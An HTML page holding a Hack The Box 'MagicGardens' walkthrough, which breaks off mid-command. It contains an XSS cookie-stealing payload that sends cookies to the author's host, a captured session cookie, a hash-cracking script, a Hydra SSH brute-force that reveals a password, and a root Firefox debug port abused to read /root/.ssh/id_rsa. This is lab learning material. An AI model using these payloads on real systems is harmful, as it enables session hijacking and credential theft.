+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#root-flag--user-flag">Root Flag &amp; User Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = decodeURIComponent(e.attr('id'));
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <table>
+<thead>
+<tr>
+<th>Link:</th>
+<th><a href="https://app.hackthebox.com/machines/MagicGardens" target="_blank">https://app.hackthebox.com/machines/MagicGardens</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Difficulty</td>
+<td>Insane</td>
+</tr>
+<tr>
+<td>Machine</td>
+<td>Linux</td>
+</tr>
+</tbody>
+</table>
+<hr>
+
+
+<h2 class="relative group">Enumeration 
+    <div id="enumeration" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>As usual, initiating an Nmap scan on this machine with the command <strong><code>nmap 10.10.11.9 -T4 -vv -p-</code></strong> yields the following output:</p>
+<pre tabindex="0"><code>PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack
+25/tcp   open  smtp    syn-ack
+80/tcp   open  http    syn-ack
+1337/tcp open  waste   syn-ack
+5000/tcp open  upnp    syn-ack
+</code></pre><p>I also conducted an aggressive scan on the ports, and here is the output for that:</p>
+<pre tabindex="0"><code>PORT     STATE SERVICE  REASON         VERSION
+22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 e0:72:62:48:99:33:4f:fc:59:f8:6c:05:59:db:a7:7b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE+EeX4lxNTcWYvgDh0dFVJlf0h9G0LwupXad6GDD9ct6lKEgELk3y0YuoNg/tOzn8t3TvhMsfAK2zB8dKfenM4=
+|   256 62:c6:35:7e:82:3e:b1:0f:9b:6f:5b:ea:fe:c5:85:9a (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIYE2YyLpUp0IAWy3y5WUxFUEuF51LNMOevqPNzYKudU
+25/tcp   open  smtp     syn-ack ttl 63 Postfix smtpd
+|_smtp-commands: magicgardens.magicgardens.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
+80/tcp   open  http     syn-ack ttl 63 nginx 1.22.1
+|_http-server-header: nginx/1.22.1
+| http-methods: 
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-title: Magic Gardens
+|_http-favicon: Unknown favicon MD5: 2D4E563DC4B95F3EDDD2DA91D4ED426A
+1337/tcp open  waste?   syn-ack ttl 63
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, TerminalServer, TerminalServerCookie, X11Probe, afp, giop, ms-sql-s: 
+|_    [x] Handshake error
+5000/tcp open  ssl/http syn-ack ttl 62 Docker Registry (API: 2.0)
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2023-05-23T11:57:43
+| Not valid after:  2024-05-22T11:57:43
+| MD5:   2f97:8372:17ae:abe4:a4d9:5937:f438:3e71
+| SHA-1: a6f9:ce07:c808:150a:00aa:f193:1b72:a963:f414:f57c
+| -----BEGIN CERTIFICATE-----
+| MIIFazCCA1OgAwIBAgIUDWhFdCp8MnPK7iV0Eqp2Tn4y5OQwDQYJKoZIhvcNAQEL
+| BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
+| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMzA1MjMxMTU3NDNaFw0yNDA1
+| MjIxMTU3NDNaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
+| HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
+| AQUAA4ICDwAwggIKAoICAQDch9kz4icrrlZKg4blZD2CfpvP6Gj3SdJgywfEiJNu
+| LX0Vxj1nxCNwcGuHsVXDIcHNfVjd8rS/zHrtUF70ONjXfWRPQo7jhEEV4+zTtXjz
+| X4aoesPoYCD3fc7TSbLjWCJELKdtrdOxST0QMPkeQQYf37FARHvnGNAAKHEwL9mO
+| EtvgRUvxKrUcKAB9XdAORZjzfSe67bedF47n7+CFx4imizS74dmXx99Kwgvb4JO3
+| LrKlQR/K7lsqNAbykuPMxKrO2l1sVNMtxo5/BLkG2aTBMI12Mbr+dJ2C4LKGsSzj
+| 2Z9vJR9EoOJCv5BzYmB2iCBe/6itnxFj+f1YJUDMA1j191O4gI9pp3K5hm9u5Avk
+| kDhOgqfsaD02X/KFClnRnL3nY5GQAUw4HqLc3qgdf4DorD7hecEUehLhvYMDCBlq
+| 0wdpwsOQCpQdJwg8fE+pyAciCpNc6tX73x5juhkyRaPg7okwMB9y0d1aN7601yCy
+| TX0ITmMLP8WJUvRLTrmQWDDmg434gwc/GH8RoLyR12+B7731X07EXaA6nyNleMvg
+| BV6X++MgItCuAQv4yVgfXJ49DL3n2SH66COElyr+L/m64gbuhsGjxNLIgELLKUkO
+| 3lJbHTpqDzBGGo/C1/vYZE2gj7/JZPeDWm0otm1T3trKIHkGuSDqVcbe6Rm8xtGb
+| 9QIDAQABo1MwUTAdBgNVHQ4EFgQUK9LKRtUE2IAKDDfGCrqB/hG1irMwHwYDVR0j
+| BBgwFoAUK9LKRtUE2IAKDDfGCrqB/hG1irMwDwYDVR0TAQH/BAUwAwEB/zANBgkq
+| hkiG9w0BAQsFAAOCAgEAM8+ImqdW9fT9jVE0XTGi0PmYM7bwXKWlJQU1NhzisuI2
+| 7IzLsTH1HhysrMmksJu4/EdCMZdZFCpvPcZZqRzltJl0BW0Fcbl6YT12JCosbIRG
+| GhhNKt/Pi/1/Gbx0e3WjzNHMN/3RN4ARFx5MxL6yImJDq7+Xr2FJNvUeQ4HyUEH0
+| Qvz5PFhArLyUz3/NFqV4LxxyjxoLWyd8WXwFo71aq1GWLu9R/2RL+WPhN946TYlh
+| p/iJV3SeemHIgRdWDGkXxRe6itp2zA/nkggxxy5TexbPY2z7VwAMqIizIKAEScFm
+| t/cj12LxRswz2xicoNcC/nhoIxpZWh3qLfPh1W3gqMgAZvtPLDVQQvhNiJhJ2jPu
+| D6SozctK1yA9uGkEFUEhOiNZ2X2vENiqJGggQsDQKDSrGS2sqZvKXoyNqcHQsUBI
+| m5EZ6PQRgr4JMk2/JTqjpl2yN+EV7kfqrj5m6oiXmBOdg4osLse+7zLWUWSLwlic
+| jrwMmoQsRbgKCA5+pB+CnKBVZjxKPw3qneqK3Gp2qVNf/yVKK0fFUhCYgRiqxfAz
+| PhySBYrxEfqIqoMxCWIcnvvyil8rLJd4QEVAok5zZVIEohhlDhLZ60wnx2wNygA+
+| s/nOcZJ2ylq6Lz7syIeAzG9YeLkFOuRtQXj8CuwhLcDPliLrrjJiwYmMYBpb7Z0=
+|_-----END CERTIFICATE-----
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn&#39;t have a title.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1337-TCP:V=7.94SVN%I=7%D=5/21%Time=664C4533%P=x86_64-pc-linux-gnu%r
+SF:(GenericLines,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(GetRequest,15,&#34;\[
+SF:x\]\x20Handshake\x20error\n\0&#34;)%r(HTTPOptions,15,&#34;\[x\]\x20Handshake\x2
+SF:0error\n\0&#34;)%r(RTSPRequest,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(RPCC
+SF:heck,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(DNSVersionBindReqTCP,15,&#34;\
+SF:[x\]\x20Handshake\x20error\n\0&#34;)%r(DNSStatusRequestTCP,15,&#34;\[x\]\x20Han
+SF:dshake\x20error\n\0&#34;)%r(Help,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(Te
+SF:rminalServerCookie,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(X11Probe,15,
+SF:&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(FourOhFourRequest,15,&#34;\[x\]\x20Han
+SF:dshake\x20error\n\0&#34;)%r(LPDString,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)
+SF:%r(LDAPSearchReq,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(LDAPBindReq,15
+SF:,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(LANDesk-RC,15,&#34;\[x\]\x20Handshake
+SF:\x20error\n\0&#34;)%r(TerminalServer,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%
+SF:r(NCP,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(NotesRPC,15,&#34;\[x\]\x20Han
+SF:dshake\x20error\n\0&#34;)%r(JavaRMI,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r
+SF:(ms-sql-s,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;)%r(afp,15,&#34;\[x\]\x20Hand
+SF:shake\x20error\n\0&#34;)%r(giop,15,&#34;\[x\]\x20Handshake\x20error\n\0&#34;);
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.94SVN%E=4%D=5/21%OT=22%CT=%CU=36529%PV=Y%DS=2%DC=T%G=N%TM=664C4589%P=x86_64-pc-linux-gnu)
+SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)
+WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
+ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)
+T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 19.495 days (since Wed May  1 15:02:55 2024)
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host:  magicgardens.magicgardens.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   86.15 ms 10.10.14.1
+2   90.57 ms magicgardens.htb (10.10.11.9)
+</code></pre><p>I ran Gobuster on the HTTP port to explore the web service for any potentially interesting findings or endpoints. Here&rsquo;s the output from Gobuster:</p>
+<pre tabindex="0"><code>/search               (Status: 301) [Size: 0] [--&gt; /search/]
+/login                (Status: 301) [Size: 0] [--&gt; /login/]
+/register             (Status: 301) [Size: 0] [--&gt; /register/]
+/profile              (Status: 301) [Size: 0] [--&gt; /profile/]
+/subscribe            (Status: 301) [Size: 0] [--&gt; /subscribe/]
+/catalog              (Status: 301) [Size: 0] [--&gt; /catalog/]
+/admin                (Status: 301) [Size: 0] [--&gt; /admin/]
+/cart                 (Status: 301) [Size: 0] [--&gt; /cart/]
+/logout               (Status: 301) [Size: 0] [--&gt; /logout/]
+/check                (Status: 301) [Size: 0] [--&gt; /check/]
+</code></pre>
+
+<h2 class="relative group">Initial Access 
+    <div id="initial-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#initial-access" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>I visited the &lsquo;admin&rsquo; page, which displayed &lsquo;Django Login,&rsquo; indicating it&rsquo;s a login page for a Django application. Additionally, I found an &lsquo;Upgrade Subscription&rsquo; option in the &lsquo;/profile&rsquo; endpoint within our web application.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%201.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>I intercepted the request and modified it to redirect to my bank (netcat session), resulting in the following outcome:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 6969
+listening on [any] 6969 ...
+connect to [10.10.14.46] from (UNKNOWN) [10.10.11.9] 48528
+POST /api/payments/ HTTP/1.1
+Host: 10.10.14.46:6969
+User-Agent: python-requests/2.31.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 133
+Content-Type: application/json
+
+{&#34;cardname&#34;: &#34;Caleb Daniel&#34;, &#34;cardnumber&#34;: &#34;5358966261393853&#34;, &#34;expmonth&#34;: &#34;Janurary&#34;, &#34;expyear&#34;: &#34;2029&#34;, &#34;cvv&#34;: &#34;081&#34;, &#34;amount&#34;: 25}
+</code></pre><p>Not particularly useful in terms of gaining access, but we did identify that the web application is using Python Requests version 2.31.0. Perhaps we could attempt to create our own bank API with a similar structure required for the previous POST request and simulate a fake purchase to see if any vulnerabilities surface.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/flask-bank-api]
+└─$ ls
+app.py
+                                                                                                                                                             
+┌──(kali㉿kali)-[~/flask-bank-api]
+└─$ cat app.py               
+from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+@app.route(&#39;/api/payments/&#39;, methods=[&#39;POST&#39;])
+def handle_payment():
+    req_json = request.get_json()
+    req_json[&#39;status&#39;] = &#34;200&#34;
+    print(req_json)
+    return jsonify(req_json)
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;, port=80, debug=True)
+
+                                                                                                                                                             
+┌──(kali㉿kali)-[~/flask-bank-api]
+└─$ python app.py                                                                                 
+ * Serving Flask app &#39;app&#39;
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://192.168.146.128:80
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 128-738-132
+</code></pre><p>I replaced the bank URL with my own Flask API that we created, and subsequently, I observed the information being sent to us through our Flask app bank API.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%202.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%203.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>As we can see, the fake bank API we created enabled us to successfully complete the subscription process.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%204.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>After some exploration and broadening the scope of the web application, I discovered an interesting feature: when purchasing a product (e.g., flowers), we receive a message from Morty offering a 25% discount in exchange for a QR code. Given that Morty is a valid user, I started considering the possibility of stealing his token using XSS through a file upload feature. This could be a potential avenue for further investigation.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%205.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>I attempted to craft a malicious QR code PNG payload to capture the session token of the user &lsquo;morty.&rsquo;</p>
+<p>The payload I used was: <strong><code>098f6bcd4621d373cade4e832627b4f6.0d341bcdc6746f1d452b3f4de32357b9.&lt;/p&gt;&lt;script&gt;var i=new Image(); i.src=&quot;http://10.10.14.46:7777/?cookie=&quot;+btoa(document.cookie);&lt;/script&gt;&lt;p&gt;</code>, and Of course, this payload was embedded within a QR code in PNG format.</strong></p>
+<p>I crafted this payload using the CyberChef website, then uploaded it to the message box. After waiting for a while, I successfully captured the cookie:</p>
+<pre tabindex="0"><code>10.10.11.9 - - [21/May/2024 09:48:22] &#34;GET /?cookie=Y3NyZnRva2VuPXpPVGE3bUhxRzhZUGc1TVA1V3lLRFNzOGZQbVF2ZVFFOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXM5UGxVOmMwZTRZaGJWVjlpem0yMVZudXl2YlNRR0NkcWI3VVlFbFhPMDlSVHpCSkU= HTTP/1.1&#34; 200 -
+</code></pre><p>Using the captured cookie, I successfully logged in to the Django admin login page.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%206.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>I discovered the password hash on the admin page and then proceeded to write the following script to crack it:</p>
+<pre tabindex="0"><code>from passlib.hash import django_pbkdf2_sha256
+hash = &#39;HASH VALUE HERE&#39; # enter the hash value here to decrypt
+rounds = hash.split(&#39;$&#39;)[1]
+salt = hash.split(&#39;$&#39;)[2]
+
+with open(&#34;../rockyou.txt&#34;, &#34;r&#34;, errors=&#34;ignore&#34;) as f:
+        for key in f:
+                secret = key.split()[0]
+                print(secret, end=&#39;\r&#39;)
+                if django_pbkdf2_sha256.hash(secret, rounds=rounds, salt=salt) == hash:
+                        print(&#34;password: &#34; + secret)
+</code></pre><p>We also have the option to use hashcat, which successfully cracked the password as &lsquo;jonasbrothers.&rsquo; Alternatively, we can perform SSH brute-forcing with Hydra using the rockyou.txt wordlist. I executed the command: <strong><code>hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb</code></strong> to attempt to brute-force the user &lsquo;morty&rsquo; and see if it works. Indeed, it seems that by skipping the step of stealing the cookie and directly attempting SSH brute-forcing, we can still uncover the password.</p>
+<p>After some time, the password was successfully cracked:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 04:05:23
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://magicgardens.htb:22/
+[STATUS] 109.00 tries/min, 109 tries in 00:01h, 14344293 to do in 2193:20h, 13 active
+[STATUS] 92.00 tries/min, 276 tries in 00:03h, 14344126 to do in 2598:35h, 13 active
+[STATUS] 85.86 tries/min, 601 tries in 00:07h, 14343801 to do in 2784:26h, 13 active
+[STATUS] 81.93 tries/min, 1229 tries in 00:15h, 14343173 to do in 2917:40h, 13 active
+[22][ssh] host: magicgardens.htb   login: morty   password: jonasbrothers
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-21 04:31:36
+</code></pre><p>I promptly SSHed to the user account, but to my surprise, there was no user.txt file. It seems that it might be located in a different user&rsquo;s directory. Interestingly, there is a user named &lsquo;alex,&rsquo; so it&rsquo;s possible our user flag might be there. Let&rsquo;s investigate further.</p>
+
+
+<h2 class="relative group">Root Flag &amp; User Flag 
+    <div id="root-flag--user-flag" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#root-flag--user-flag" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Upon running Linpeas on the machine, I discovered a Firefox process running as root, with remote debugging enabled and configured to allow localhost on port 34001. This could potentially provide us with a means of further exploration and privilege escalation.</p>
+<pre tabindex="0"><code>root        1936  4.9 11.6 11875692 467716 ?     Sl   May20  16:51                  _ firefox-esr --marionette --headless --remote-debugging-port 34001 --remote-allow-hosts localhost -no-remote -profile /tmp/rust_mozprofileu1v0Uq
+</code></pre><p>I proceeded to use Chisel to set up port forwarding to gain access from my local machine. Here&rsquo;s what I did after transferring Chisel to the Linux box:</p>
+<ol>
+<li>On my Kali machine: <strong><code>./chisel server -p 8000 --reverse</code></strong></li>
+<li>On the target machine: <strong><code>./chisel client 10.10.14.46:8000 R:34001:127.0.0.1:34001</code></strong></li>
+</ol>
+<p>Once completed, we can access the Firefox remote debugging port at <strong><code>localhost:34001</code></strong>. This should enable us to interact with the Firefox process running as root on the target machine.</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="MagicGardens%201b6964f094494bd08cf342e4e656dfd6/Untitled%207.png" alt="Untitled" />
+      
+    </figure>
+</p>
+<p>As observed, there is an <strong><code>httpd.js</code></strong> running on this port. I proceeded to attempt brute-forcing the directory, which uncovered various endpoints:</p>
+<pre tabindex="0"><code>/trace                (Status: 200) [Size: 194]
+/json                 (Status: 200) [Size: 302]
+/session              (Status: 400) [Size: 61]
+</code></pre><p>The &ldquo;/trace&rdquo; endpoint contains the following content:</p>
+<pre tabindex="0"><code>Request-URI: http://localhost:34001/trace
+
+Request (semantically equivalent, slightly reformatted):
+
+GET /trace HTTP/1.1
+host: localhost:51523
+user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+accept-language: en-US,en;q=0.5
+accept-encoding: gzip, deflate
+connection: close
+cookie: jiveforums.admin.logviewer=logfile.size=1700758
+upgrade-insecure-requests: 1
+sec-fetch-dest: document
+sec-fetch-mode: navigate
+sec-fetch-site: none
+sec-fetch-user: ?1
+</code></pre><p>The &ldquo;/json&rdquo; endpoint contains the following content:</p>
+<pre tabindex="0"><code>[
+  {
+    &#34;description&#34;: &#34;&#34;,
+    &#34;devtoolsFrontendUrl&#34;: null,
+    &#34;faviconUrl&#34;: &#34;&#34;,
+    &#34;id&#34;: &#34;96a0d569-23aa-46ad-8815-5fc1f1a4fbb8&#34;,
+    &#34;type&#34;: &#34;page&#34;,
+    &#34;url&#34;: &#34;http://magicgardens.htb/admin/store/order/&#34;,
+    &#34;webSocketDebuggerUrl&#34;: &#34;ws://127.0.0.1:34001/devtools/page/96a0d569-23aa-46ad-8815-5fc1f1a4fbb8&#34;
+  }
+]
+</code></pre><p>I encountered an error when accessing the &ldquo;/session&rdquo; endpoint: &ldquo;The handshake request has incorrect Upgrade header: undefined&rdquo;.</p>
+<p>To address this, I installed websocat, similar to netcat, on my target machine from the following link: <a href="https://github.com/vi/websocat/releases/tag/v1.13.0" target="_blank">websocat v1.13.0</a></p>
+<p>After installation, I executed the following command:</p>
+<pre tabindex="0"><code>morty@magicgardens:/tmp$ curl http://127.0.0.1:34001/json/version
+{
+        &#34;Browser&#34;: &#34;Firefox/115.10.0&#34;,
+        &#34;Protocol-Version&#34;: &#34;1.3&#34;,
+        &#34;User-Agent&#34;: &#34;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;,
+        &#34;V8-Version&#34;: &#34;1.0&#34;,
+        &#34;WebKit-Version&#34;: &#34;1.0&#34;,
+        &#34;webSocketDebuggerUrl&#34;: &#34;ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584&#34;
+}
+</code></pre><p>After installing websocat, I proceeded to run the following command(on target machine):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;{&#34;id&#34;: 1, &#34;method&#34;: &#34;Target.createTarget&#34;, &#34;params&#34;: {&#34;url&#34;: &#34;file:///root/.ssh/id_rsa&#34;}}&#39;</span> <span class="p">|</span> ./websocat.x86_64-unknown-linux-musl ws://127.0.0.1:34001/devtools/browser/9504c560-b7ca-475f-bd9c-90354827c584
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;id&#34;</span>:1,<span class="s2">&#34;result&#34;</span>:<span class="o">{</span><span class="s2">&#34;targetId&#34;</span>:<span class="s2">&#34;151f6650-6d16-4d66-809b-f6dc06b2643b&#34;</span><span class="o">}}</span>
